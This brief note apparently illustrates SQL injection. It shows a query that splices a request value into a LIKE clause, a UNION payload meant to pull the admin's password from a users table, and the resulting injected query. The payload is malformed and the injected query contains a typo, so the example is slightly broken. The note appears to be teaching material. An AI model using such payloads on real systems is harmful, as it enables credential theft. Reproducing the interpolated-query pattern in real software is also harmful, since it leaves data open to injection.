#sqli
## Code
```sql
SELECT username, email
FROM users 
WHERE email LIKE '%$request%' 
LIMIT 10;
```

## Payload
Request:
```sql
' and UNION SELECT username, password FROM users WHERE username='admin' --
```

## Injected
```sql
SELECT sername, email
FROM users 
WHERE email LIKE '%' and UNION SELECT username, password FROM users WHERE username='admin' --%' 
LIMIT 10;
```
